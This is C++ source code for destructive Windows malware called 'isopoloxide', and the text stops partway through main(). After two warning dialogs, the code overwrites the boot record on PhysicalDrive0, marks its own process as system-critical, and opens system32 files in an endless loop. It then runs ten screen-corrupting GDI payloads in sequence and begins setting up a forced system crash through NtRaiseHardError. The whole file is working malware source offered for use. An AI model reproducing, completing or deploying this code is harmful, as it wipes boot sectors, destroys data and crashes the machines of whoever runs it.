#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <sstream>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <cmath>
#include <time.h>
typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;
#define M_PI   3.14159265358979323846264338327950288
//#define PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

DWORD WINAPI system32(LPVOID lpParam) {
	HANDLE hFindFile;
	BOOL BVar1;
	int auStack612[4];
	_WIN32_FIND_DATAW local_260;

	do {
		do {
			hFindFile = FindFirstFileW(L"C:\\WINDOWS\\system32\\*.*", &local_260); //open random system32 files, like monoxide
			ShellExecuteW((HWND)0x0, L"open", local_260.cFileName, (LPCWSTR)0x0, (LPCWSTR)0x0, 5);
			BVar1 = FindNextFileW(hFindFile, &local_260);
		} while (BVar1 == 0);
		do {
			ShellExecuteW((HWND)0x0, L"open", local_260.cFileName, (LPCWSTR)0x0, (LPCWSTR)0x0, 5);
			Sleep(0xfa);
			BVar1 = FindNextFileW(hFindFile, &local_260);
		} while (BVar1 != 0);
	} while (true);
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI payload1 (LPVOID lpParam) {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
	int v3; // [rsp+8Ch] [rbp+Ch]
	int v4; // [rsp+90h] [rbp+10h]
	int v5; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v5 = i % SystemMetrics;
			v4 = i % SystemMetrics * i / SystemMetrics;
			v3 = v4 - i % SystemMetrics / 255 + cy;
			*((BYTE*)ppvBits + 4 * i + 2) += (i % SystemMetrics < v4) > cy / SystemMetrics - v3 + 255;
			*((BYTE*)ppvBits + 4 * i + 1) += (unsigned __int16)(v5 + v4 - 255 / cy) >> 8;
			*((BYTE*)ppvBits + 4 * i) += (unsigned int)(v4 / cy + v5 + SystemMetrics / 255) >> 16;
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload2 (LPVOID lpParam) {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
	int v3; // [rsp+8Ch] [rbp+Ch]
	int v4; // [rsp+90h] [rbp+10h]
	int v5; // [rsp+94h] [rbp+14h]
	int v6; // [rsp+98h] [rbp+18h]
	int v7; // [rsp+9Ch] [rbp+1Ch]
	int v8; // [rsp+A0h] [rbp+20h]
	int v9; // [rsp+A4h] [rbp+24h]
	HGDIOBJ h; // [rsp+A8h] [rbp+28h]
	int cy; // [rsp+B0h] [rbp+30h]
	int SystemMetrics; // [rsp+B4h] [rbp+34h]
	HDC hdcSrc; // [rsp+B8h] [rbp+38h]
	HDC hdc; // [rsp+C0h] [rbp+40h]
	int i; // [rsp+CCh] [rbp+4Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v9 = i % SystemMetrics;
			v8 = i / SystemMetrics;
			v7 = 1 ^ (i / SystemMetrics);
			v6 = i / SystemMetrics * (i / SystemMetrics);
			v5 = i % SystemMetrics * (i % SystemMetrics);
			v4 = v5 / 1 + v5;
			v3 = v6 / 1 + v6;
			*((DWORD*)ppvBits + i) += v4 - v3;
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload3 (LPVOID lpParam) {
	BITMAPINFO bmi; // [rsp+50h] [rbp-30h] BYREF
	PRGBQUAD rgbScreen; // [rsp+88h] [rbp+8h] BYREF
	int code; // [rsp+90h] [rbp+10h]
	INT Yii; // [rsp+94h] [rbp+14h]
	INT Xii; // [rsp+98h] [rbp+18h]
	INT y; // [rsp+9Ch] [rbp+1Ch]
	INT x; // [rsp+A0h] [rbp+20h]
	int i; // [rsp+A4h] [rbp+24h]
	HBITMAP hbmTemp; // [rsp+A8h] [rbp+28h]
	INT h; // [rsp+B0h] [rbp+30h]
	INT w; // [rsp+B4h] [rbp+34h]
	HDC hdcMem; // [rsp+B8h] [rbp+38h]
	HDC hdcScreen; // [rsp+C0h] [rbp+40h]
	INT i_0; // [rsp+CCh] [rbp+4Ch]

	hdcScreen = GetDC(0i64);
	hdcMem = CreateCompatibleDC(hdcScreen);
	w = GetSystemMetrics(0);
	h = GetSystemMetrics(1);
	memset(&bmi, 0, sizeof(bmi));
	rgbScreen = 0i64;
	bmi.bmiHeader.biSize = 44;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0i64, 0);
	SelectObject(hdcMem, hbmTemp);
	i = 1;
	while (1)
	{
		hdcScreen = GetDC(0i64);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0x330008u);
		for (i_0 = 0; h * w > i_0; ++i_0)
		{
			x = i_0 % w;
			y = i_0 / w;
			Xii = i_0 % w * (i_0 % w);
			Yii = i_0 / w * (i_0 / w);
			code = (Yii + Xii - i_0 / w * (i_0 % w)) / 500;
			rgbScreen[i_0].b += code;
			rgbScreen[i_0].rgb *= code;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload4 (LPVOID lpParam) {
	BITMAPINFO bmi; // [rsp+50h] [rbp-30h] BYREF
	PRGBQUAD rgbScreen; // [rsp+88h] [rbp+8h] BYREF
	int code; // [rsp+90h] [rbp+10h]
	INT Yii; // [rsp+94h] [rbp+14h]
	INT Xii; // [rsp+98h] [rbp+18h]
	INT y; // [rsp+9Ch] [rbp+1Ch]
	INT x; // [rsp+A0h] [rbp+20h]
	int i; // [rsp+A4h] [rbp+24h]
	HBITMAP hbmTemp; // [rsp+A8h] [rbp+28h]
	INT h; // [rsp+B0h] [rbp+30h]
	INT w; // [rsp+B4h] [rbp+34h]
	HDC hdcMem; // [rsp+B8h] [rbp+38h]
	HDC hdcScreen; // [rsp+C0h] [rbp+40h]
	INT i_0; // [rsp+CCh] [rbp+4Ch]

	hdcScreen = GetDC(0i64);
	hdcMem = CreateCompatibleDC(hdcScreen);
	w = GetSystemMetrics(0);
	h = GetSystemMetrics(1);
	memset(&bmi, 0, sizeof(bmi));
	rgbScreen = 0i64;
	bmi.bmiHeader.biSize = 44;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0i64, 0);
	SelectObject(hdcMem, hbmTemp);
	i = 1;
	while (1)
	{
		hdcScreen = GetDC(0i64);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0x330008u);
		for (i_0 = 0; h * w > i_0; ++i_0)
		{
			x = i_0 % w;
			y = i_0 / w;
			Xii = i_0 % w * (i_0 % w);
			Yii = i_0 / w * (i_0 / w);
			code = (Yii + Xii - i_0 / w * (i_0 % w)) / 500;
			rgbScreen[i_0].b += code;
			rgbScreen[i_0].rgb -= code;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload5 (LPVOID lpParam) {
	BITMAPINFO bmi; // [rsp+50h] [rbp-30h] BYREF
	PRGBQUAD rgbScreen; // [rsp+88h] [rbp+8h] BYREF
	int code; // [rsp+90h] [rbp+10h]
	INT Yii; // [rsp+94h] [rbp+14h]
	INT Xii; // [rsp+98h] [rbp+18h]
	INT y; // [rsp+9Ch] [rbp+1Ch]
	INT x; // [rsp+A0h] [rbp+20h]
	int i; // [rsp+A4h] [rbp+24h]
	HBITMAP hbmTemp; // [rsp+A8h] [rbp+28h]
	INT h; // [rsp+B0h] [rbp+30h]
	INT w; // [rsp+B4h] [rbp+34h]
	HDC hdcMem; // [rsp+B8h] [rbp+38h]
	HDC hdcScreen; // [rsp+C0h] [rbp+40h]
	INT i_0; // [rsp+CCh] [rbp+4Ch]

	hdcScreen = GetDC(0i64);
	hdcMem = CreateCompatibleDC(hdcScreen);
	w = GetSystemMetrics(0);
	h = GetSystemMetrics(1);
	memset(&bmi, 0, sizeof(bmi));
	rgbScreen = 0i64;
	bmi.bmiHeader.biSize = 44;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0i64, 0);
	SelectObject(hdcMem, hbmTemp);
	i = 1;
	while (1)
	{
		hdcScreen = GetDC(0i64);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0x330008u);
		for (i_0 = 0; h * w > i_0; ++i_0)
		{
			x = i_0 % w;
			y = i_0 / w;
			Xii = i_0 % w * (i_0 % w);
			Yii = i_0 / w * (i_0 / w);
			code = ((i_0 / w ^ (i_0 % w)) * (Xii - Yii)) / 500;
			rgbScreen[i_0].b += code;
			rgbScreen[i_0].rgb += code;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload6 (LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int h = screenHeight;
				int w = screenWidth;
				INT Yii = y * y;
				INT Xii = x * x;
				INT Xiii = Xii + Xii / 5;
				INT Yiii = Yii + Yii / 5;
				int fx = sqrt(Xii * Yii);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload7 (LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int h = screenHeight;
				int w = screenWidth;
				INT Yii = y * y;
				INT Xii = x * x;
				INT Xiii = Xii + Xii / 5;
				INT Yiii = Yii + Yii / 5;
				int fx = (int)((i * 2) * sqrt(x + y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);
				hslcolor.s = 0.7f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload8 (LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int h = screenHeight;
				int w = screenWidth;
				INT Yii = y * y;
				INT Xii = x * x;
				INT Xiii = Xii + Xii / 5;
				INT Yiii = Yii + Yii / 5;
				int fx = (int)((i * 2) * sqrt(x | y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);
				hslcolor.s = 0.7f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload9 (LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int h = screenHeight;
				int w = screenWidth;
				INT Yii = y * y;
				INT Xii = x * x;
				INT Xiii = Xii + Xii / 5;
				INT Yiii = Yii + Yii / 5;
				int fx = (int)((i * 2) * sqrt(x - y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);
				hslcolor.s = 0.7f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload10(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int h = screenHeight;
				int w = screenWidth;
				INT Yii = y * y;
				INT Xii = x * x;
				INT Xiii = Xii + Xii / 5;
				INT Yiii = Yii + Yii / 5;
				int fx = (int)((i * 2) * sin(x ^ y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * 10.f, 1.f);
				hslcolor.s = 0.7f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
int main() {
	HANDLE v7;
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"WARNING!!!\r\n\This sortware can destroy your computer!!!\r\n\It can delete all your data\r\n\Click yes if you're currently running on virtual space\r\n\If you don't agree terms, press no NOW\r\n\Process with caution!!!", L"isopoloxide", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ !!!\r\n\This sortware can destroy your computer!!!\r\n\It can delete all your data\r\n\Click yes if you're currently running on virtual space\r\n\If you don't agree terms, press no NOW\r\n\If you running this on a real pc, you'll be responsible!", L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷  - isopoloxide", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			DWORD NumberOfBytesWritten;
			v7 = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0, 3u, 0, 0);
			WriteFile(v7, "ë", 0x200u, &NumberOfBytesWritten, 0);
			CloseHandle(v7);
			ProcessIsCritical();
			MessageBoxW(NULL, L"this malware has upm bypass >:)", ERROR, MB_OK | MB_ICONASTERISK);
			CreateThread(0, 0, system32, 0, 0, 0);
			Sleep(1000);
			HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, payload9, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			HANDLE thread9 = CreateThread(0, 0, payload10, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
